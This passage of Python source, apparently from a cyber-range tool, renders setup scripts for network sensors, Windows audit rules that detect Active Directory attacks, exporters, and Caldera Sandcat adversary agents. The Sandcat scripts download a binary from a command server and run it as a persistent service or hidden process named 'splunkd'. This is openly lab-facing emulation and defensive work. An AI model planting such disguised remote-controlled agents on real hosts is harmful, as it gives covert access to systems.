        # present; `-C` alone (no `-G`) just appends a numeric suffix, no
        # timestamp. `-W` (the cyclic file-COUNT cap) is DROPPED on purpose:
        # retention is now the disk-%/count watchdog's job below, not an
        # overwrite ring. Compression (the appliance's `.zst` `-z` hook) is
        # skipped here to keep the prune script simple. Note the watchdog's
        # own glob is `cap-*` (NOT `cap-*.pcap`) -- see
        # `_render_capture_pcap_watchdog`'s docstring: tcpdump's `-C`
        # size-rotation counter lands AFTER the `.pcap` extension
        # (`cap-<ts>.pcap1`, `.pcap2`, ...), so a `.pcap`-suffixed glob missed
        # most of the rotated files under sustained traffic.
        cmd = (
            f"exec tcpdump -i {iface} -nn -Z root "
            f"-w {capdir}/cap-%Y%m%d-%H%M%S.pcap "
            f"-G {_CAPTURE_ROTATE_SECONDS} -C {_CAPTURE_ROTATE_MB}"
        )
        body = (
            _sensor_apt_ensure("tcpdump")
            + f"install -d -m 0755 {capdir}\n"
            + systemd_daemon_start_block(
                unit, cmd, log_path=log_path, label=f"tcpdump-sensor {sensor_id}"
            )
            + _render_capture_pcap_watchdog(
                sensor_id, safe, capdir,
                high_pct=capture_high_water_pct, low_pct=capture_low_water_pct,
                max_files=capture_max_files,
            )
            + f'echo "[axrange] tcpdump-sensor {sensor_id} capturing {iface} -> '
            f'{capdir}/cap-*"\n'
        )
    elif sensor_type == "suricata-sensor":
        rules = config_content if config_content is not None else _DEFAULT_SENSOR_RULES
        rules_path = "/etc/suricata/rules/axrange.rules"
        body = (
            _sensor_apt_ensure("suricata")
            + 'install -d -m 0755 "$(dirname ' + rules_path + ')" /var/log/suricata\n'
            f"cat > {rules_path} <<'AXR_SENSOR_RULES'\n"
            f"{rules.rstrip(chr(10))}\n"
            "AXR_SENSOR_RULES\n"
            + _suricata_start_block(
                iface, rules_path, label=f"suricata-sensor {sensor_id}"
            )
        )
    elif sensor_type == "zeek-sensor":
        logdir = f"/var/log/zeek/{safe}"
        unit = f"axr-sensor-{safe}"
        log_path = f"/var/log/axrange/zeek-{safe}.log"
        # `-U <status-file>` (a real Zeek option -- periodic status/PID file)
        # keeps a per-sensor status file for observability; supervision itself
        # is now `systemctl is-active` (below), which tracks zeek's REAL pid
        # directly via the systemd unit, so the old argv-token pkill/pgrep
        # matching problem this comment used to document (zeek's own argv
        # carrying no per-sensor token) no longer applies -- there is no
        # string-matching liveness check left to collide.
        status_file = f"/run/zeek-{safe}.status"
        cmd = f"cd {logdir} && exec zeek -i {iface} -U {status_file}"
        body = (
            _sensor_apt_ensure("zeek")
            + f"install -d -m 0755 {logdir}\n"
            + systemd_daemon_start_block(
                unit, cmd, log_path=log_path, label=f"zeek-sensor {sensor_id}",
                settle_s=3, tail_lines=15,
            )
            + f'echo "[axrange] zeek-sensor {sensor_id} on {iface} -> {logdir}"\n'
        )
    else:
        raise ConfigRenderError(
            f"render_sensor_setup: unknown sensor type {sensor_type!r} "
            "(tcpdump-sensor / suricata-sensor / zeek-sensor)"
        )

    return head + body


def render_defense_agent_config(entry: dict[str, Any], *, config_content: str | None) -> str:
    """Render a host defense agent's config/enable script (docs/SLICE_OVERLAY.md
    §4b). Drops the operator `config:` at the tool's path, records ruleset
    metadata, and enables the service best-effort (a not-yet-installed agent
    binary leaves the config staged + the enable a no-op, not a hard failure)."""
    defense_id = str(entry.get("id") or "defense")
    tool = str(entry.get("tool") or "agent")
    ruleset = str(entry.get("ruleset") or "")
    dest, enable = _defense_tool_spec(tool)
    meta_path = f"/etc/axrange/defense/{_ACT_SAFE.sub('-', defense_id)}.env"

    lines = [
        "#!/bin/bash",
        f"# axRange defense agent: {defense_id} (tool={tool})",
        "set -u",
        "install -d -m 0755 /etc/axrange/defense",
    ]
    if config_content is not None:
        lines += [
            f'install -d -m 0755 "$(dirname {dest})"',
            f"cat > {dest} <<'AXR_DEFENSE_CFG'",
            config_content.rstrip("\n"),
            "AXR_DEFENSE_CFG",
        ]
    lines += [
        f"cat > {meta_path} <<'AXR_DEFENSE_ENV'",
        f"DEFENSE_ID={defense_id}",
        f"TOOL={tool}",
        f"RULESET={ruleset}",
        f"CONFIG_DEST={dest if config_content is not None else ''}",
        "AXR_DEFENSE_ENV",
        enable,
        f'echo "[axrange] defense agent {defense_id} ({tool}) configured"',
    ]
    return "\n".join(lines) + "\n"


# Windows audit subcategory GUIDs (locale-independent) for the AD attack chain.
# Enabling these makes the DC's Security event log record the host-side signatures
# that Sysmon/Wazuh/Splunk forward.
_WIN_AUDIT_SUBCATEGORIES = (
    ("{0CCE9242-69AE-11D9-BED3-505054503030}", "Kerberos Authentication Service (4768 AS-REQ — AS-REP roast)"),
    ("{0CCE9240-69AE-11D9-BED3-505054503030}", "Kerberos Service Ticket Operations (4769 TGS — Kerberoast)"),
    ("{0CCE923B-69AE-11D9-BED3-505054503030}", "Directory Service Access (4662 — DCSync)"),
    ("{0CCE9215-69AE-11D9-BED3-505054503030}", "Logon (4624/4625)"),
    ("{0CCE923F-69AE-11D9-BED3-505054503030}", "Credential Validation (4776)"),
)

# DS-Replication-Get-Changes[-All] extended-right GUIDs — the rights DCSync uses;
# auditing them on the domain root yields 4662 for a DCSync.
_DCSYNC_REPL_RIGHTS = (
    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",  # Replicating Directory Changes
    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",  # Replicating Directory Changes All
)


def render_windows_defense_agent(
    entry: dict[str, Any], *, config_content: str | None
) -> str:
    """Host-side AD detection on a Windows DC (Sysmon/Wazuh substrate). Enables the
    Windows audit subcategories that record the AD attack chain into the Security
    event log (4768/4769 Kerberos, 4662 DCSync, 4624/4625 logon, 4776), adds a
    best-effort domain-root SACL so DCSync yields 4662, drops an optional agent
    config (e.g. a Sysmon XML), and best-effort enables a baked EDR service
    (Wazuh/Sysmon). The audit policy IS the detection substrate Sysmon/Wazuh forward;
    a baked agent binary is a follow-on (docs/SLICE_WINDOWS_AD.md host-side detection)."""
    defense_id = str(entry.get("id") or "defense")
    tool = str(entry.get("tool") or "agent")
    did_safe = re.sub(r"[^A-Za-z0-9_.-]", "-", defense_id)
    lines = [
        "$ErrorActionPreference='Continue'",
        f"# axRange host-side AD detection: {defense_id} (tool={tool})",
        "New-Item -ItemType Directory -Force -Path 'C:\\axrange\\defense' | Out-Null",
        "# 1. Enable the AD-relevant audit subcategories (Security event log).",
    ]
    for guid, label in _WIN_AUDIT_SUBCATEGORIES:
        lines.append(
            f'auditpol /set /subcategory:"{guid}" /success:enable /failure:enable | Out-Null  # {label}'
        )
    # 2. Best-effort domain-root SACL so a DCSync produces 4662.
    rights = ",".join(f"'{r}'" for r in _DCSYNC_REPL_RIGHTS)
    lines += [
        "# 2. Audit the replication extended rights on the domain root (DCSync -> 4662).",
        "try {",
        "  Import-Module ActiveDirectory -ErrorAction Stop",
        "  $dn = (Get-ADDomain -ErrorAction Stop).DistinguishedName",
        "  $acl = Get-Acl -Path \"AD:$dn\"",
        "  $everyone = New-Object System.Security.Principal.SecurityIdentifier 'S-1-1-0'",
        f"  foreach ($r in @({rights})) {{",
        "    $ace = New-Object System.DirectoryServices.ActiveDirectoryAuditRule("
        "$everyone,'ExtendedRight','Success',([guid]$r))",
        "    $acl.AddAuditRule($ace) | Out-Null",
        "  }",
        "  Set-Acl -Path \"AD:$dn\" -AclObject $acl -ErrorAction Stop",
        "  Write-Output 'axr: DCSync replication SACL applied'",
        "} catch { Write-Output \"axr: DCSync SACL skipped: $_\" }",
    ]
    # 3. Optional agent config (e.g. a Sysmon XML) for a baked EDR.
    if config_content is not None:
        cfg_path = f"C:\\axrange\\defense\\{did_safe}.xml"
        b64 = base64.b64encode(config_content.encode("utf-8")).decode("ascii")
        lines += [
            "# 3. Drop the provided agent config (baked-agent consumers).",
            f"[IO.File]::WriteAllBytes('{cfg_path}', [Convert]::FromBase64String('{b64}'))",
            "if (Get-Command sysmon64 -ErrorAction SilentlyContinue) { "
            f"sysmon64 -accepteula -c '{cfg_path}' 2>&1 | Out-Null }}",
        ]
    # 4. Best-effort: enable + start a baked EDR service if present.
    lines += [
        "# 4. Enable a baked EDR service if the template carries one.",
        "foreach ($svc in 'WazuhSvc','Sysmon','Sysmon64') {",
        "  $s = Get-Service -Name $svc -ErrorAction SilentlyContinue",
        "  if ($s) { Set-Service -Name $svc -StartupType Automatic -ErrorAction SilentlyContinue; "
        "Start-Service -Name $svc -ErrorAction SilentlyContinue }",
        "}",
        f"Write-Output 'axr: host-side AD detection enabled ({defense_id})'",
        "exit 0",
    ]
    return "\n".join(lines) + "\n"


# ---------------------------------------------------------------------------
# OP-OVL-070 install-agent rendering -- default/declared non-defense agents
# (Prometheus node-exporter, Sandcat/Caldera) -- A3 Stage A,
# docs/design/08-exercise-measurement.md. Mirrors install-defense-agent's
# shape (render + os_family branch) so the two op families stay parallel;
# kept as its own functions rather than folded into `_DEFENSE_TOOLS` so
# install-defense-agent stays defense-only (per-op semantics, not conflated).
# ---------------------------------------------------------------------------

_DEFAULT_CALDERA_GROUP = "red"


def agent_script_path(agent_id: str) -> str:
    """Deterministic in-guest path for an install-agent (exporter/adversary)
    setup script -- shares the overlay scripts dir with the defense/data
    overlay scripts (distinct filename prefix, no collision)."""
    return f"{_OVERLAY_DIR}/agent-{_ACT_SAFE.sub('-', agent_id)}.sh"


def render_exporter_agent(entry: dict[str, Any]) -> str:
    """Render a best-effort Prometheus node-exporter install+enable script (a
    plain default agent, neither red nor blue -- design brief §3). Not baked
    (LES-024 flags apt-installable tools in an isolated guest as fragile) --
    best-effort here matches install-defense-agent's own "binary may be
    missing" posture: apt-install if reachable, enable if present, never a
    hard failure (an offline scenario's exporter simply stays absent)."""
    agent_id = str(entry.get("id") or "exporter")
    lines = [
        "#!/bin/bash",
        f"# axRange Prometheus node-exporter: {agent_id}",
        "set -u",
        "if ! command -v node_exporter >/dev/null 2>&1 "
        "&& ! dpkg -s prometheus-node-exporter >/dev/null 2>&1; then",
        "  apt-get update -qq 2>/dev/null && "
        "apt-get install -y -qq prometheus-node-exporter 2>/dev/null || true",
        "fi",
        "systemctl enable --now prometheus-node-exporter 2>/dev/null "
        "|| systemctl enable --now node_exporter 2>/dev/null || true",
        f'echo "[axrange] node-exporter agent {agent_id} configured"',
    ]
    return "\n".join(lines) + "\n"


def render_windows_exporter_agent(entry: dict[str, Any]) -> str:
    """Windows counterpart: best-effort enable a baked windows_exporter
    service if the template carries one (no on-demand MSI fetch in v1 --
    mirrors install-defense-agent's Windows "enable a baked service" posture)."""
    agent_id = str(entry.get("id") or "exporter")
    lines = [
        "$ErrorActionPreference='Continue'",
        f"# axRange windows_exporter: {agent_id}",
        "foreach ($svc in 'windows_exporter','wmi_exporter') {",
        "  $s = Get-Service -Name $svc -ErrorAction SilentlyContinue",
        "  if ($s) { Set-Service -Name $svc -StartupType Automatic "
        "-ErrorAction SilentlyContinue; Start-Service -Name $svc "
        "-ErrorAction SilentlyContinue }",
        "}",
        f"Write-Output 'axr: exporter agent {agent_id} best-effort enabled'",
        "exit 0",
    ]
    return "\n".join(lines) + "\n"


def render_sandcat_agent(entry: dict[str, Any], *, server: str) -> str:
    """Render a Sandcat (Caldera agent) fetch+install+enable script, pointed
    at `server` -- resolved by the caller from the overlay entry's REQUIRED
    `server:` field; TODO Stage B/A1, docs/design/08-exercise-measurement.md:
    a live O2 default. `server` must be EITHER a bare host (no scheme, no
    port -- the renderer appends the default `http://` scheme and `:8888`
    port, see `origin` below) OR a full URL (`http://host:8888`). A bare
    `host:8888` is WRONG: lacking `://`, it is treated as a bare host and the
    `:8888` is appended again, yielding `http://host:8888:8888`. The
    real Sandcat bring-up command (`curl ... -H "file:sandcat.go" .../file/
    download`, docs/design/09-content-overlays.md). Playout is
    MANUAL at the Caldera console (A3 §4/§7) -- this only plants + points
    the agent; a fetch failure (server not up yet) is a WARNING, not a hard
    op failure, since the O2 Caldera server may not exist yet in Stage A."""
    agent_id = str(entry.get("id") or "adversary")
    group = str(entry.get("group") or _DEFAULT_CALDERA_GROUP)
    origin = server if "://" in server else f"http://{server}:8888"
    meta_path = f"/etc/axrange/adversary/{_ACT_SAFE.sub('-', agent_id)}.env"
    lines = [
        "#!/bin/bash",
        f"# axRange Sandcat (Caldera) agent: {agent_id} -> {origin} (group={group})",
        "set -u",
        "install -d -m 0755 /opt/axr-sandcat /etc/axrange/adversary",
        f"cat > {meta_path} <<'AXR_ADV_ENV'",
        f"AGENT_ID={agent_id}",
        f"SERVER={origin}",
        f"GROUP={group}",
        "AXR_ADV_ENV",
        "pkill -f 'axr-sandcat/splunkd' 2>/dev/null || true",
        "sleep 1",
        'curl -s -X POST -H "file:sandcat.go" -H "platform:linux" '
        f'"{origin}/file/download" -o /opt/axr-sandcat/splunkd 2>/dev/null || true',
        "chmod +x /opt/axr-sandcat/splunkd 2>/dev/null || true",
        "if [ -x /opt/axr-sandcat/splunkd ]; then",
        "  cat > /etc/systemd/system/axr-sandcat.service <<'AXR_SANDCAT_UNIT'",
        "[Unit]",
        "Description=axRange Sandcat (Caldera) agent",
        "After=network-online.target",
        "[Service]",
        f"ExecStart=/opt/axr-sandcat/splunkd -server {origin} -group {group} -v",
        "Restart=always",
        "[Install]",
        "WantedBy=multi-user.target",
        "AXR_SANDCAT_UNIT",
        "  systemctl daemon-reload",
        "  systemctl enable --now axr-sandcat.service 2>/dev/null || true",
        f'  echo "[axrange] sandcat agent {agent_id} planted -> {origin}"',
        "else",
        f'  echo "[axrange] WARNING: sandcat fetch from {origin} failed for '
        f'{agent_id} (Caldera server not reachable yet -- Stage B/A1 stands '
        'it up); leaving the unit unconfigured" >&2',
        "fi",
    ]
    return "\n".join(lines) + "\n"


def render_windows_sandcat_agent(entry: dict[str, Any], *, server: str) -> str:
    """Windows Sandcat plant, mirroring the real `sandcat.go-windows` fetch
    (`WebClient` + `file:`/`platform:` headers, docs/design/
    09-content-overlays.md) via `Start-Process`, not a service (matches
    Caldera's own Windows on-ramp)."""
    agent_id = str(entry.get("id") or "adversary")
    group = str(entry.get("group") or _DEFAULT_CALDERA_GROUP)
    origin = server if "://" in server else f"http://{server}:8888"
    lines = [
        "$ErrorActionPreference='Continue'",
        f"# axRange Sandcat (Caldera) agent: {agent_id} -> {origin} (group={group})",
        "New-Item -ItemType Directory -Force -Path 'C:\\axrange\\adversary' | Out-Null",
        f"$server = '{origin}'",
        f"$group = '{group}'",
        "$exe = 'C:\\axrange\\adversary\\splunkd.exe'",
        "try {",
        "  $wc = New-Object System.Net.WebClient",
        "  $wc.Headers.Add('file','sandcat.go')",
        "  $wc.Headers.Add('platform','windows')",
        "  $data = $wc.DownloadData(\"$server/file/download\")",
        "  Get-Process | Where-Object { $_.Path -eq $exe } | "
        "Stop-Process -Force -ErrorAction SilentlyContinue",
        "  [IO.File]::WriteAllBytes($exe, $data)",
        "  Start-Process -FilePath $exe -ArgumentList "
        '"-server $server -group $group -v" -WindowStyle Hidden',
        f"  Write-Output ('axr: sandcat agent {agent_id} planted -> ' + $server)",
        "} catch {",
        f"  Write-Output \"axr: WARNING sandcat fetch from $server failed for "
        f"{agent_id}: $_\"",
        "}",
        "exit 0",
    ]
    return "\n".join(lines) + "\n"
